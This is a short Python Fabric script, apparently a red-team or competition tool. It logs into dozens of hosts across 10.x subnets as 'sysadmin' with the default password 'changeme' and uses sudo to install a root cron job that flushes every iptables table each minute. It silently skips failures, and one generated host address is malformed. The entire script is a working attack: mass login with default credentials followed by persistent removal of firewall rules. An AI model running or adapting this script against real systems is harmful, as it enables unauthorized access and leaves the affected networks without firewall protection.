from fabric import Connection, SerialGroup as Group, Config
import getpass
hosts = []
for i in range (1,14):
	single=f"sysadmin@10.{i}."
	hosts.extend([single+"", single+"1.20", single+"2.2", single+"2.3"])

for hostelele in hosts:
	try:
		config = Config(overrides={'sudo':{'password':'changeme'}})
		c = Connection(hostelele, connect_kwargs={"password":"changeme"}, config=config)
		c.sudo("sh -c 'cd / && printf \"* * * * * iptables -t nat -F && iptables -t filter -F && iptables -t security -F && iptables -t raw -F && iptables -t mangle -F\n\" > mycron && crontab mycron && rm mycron'")
	except:
		continue
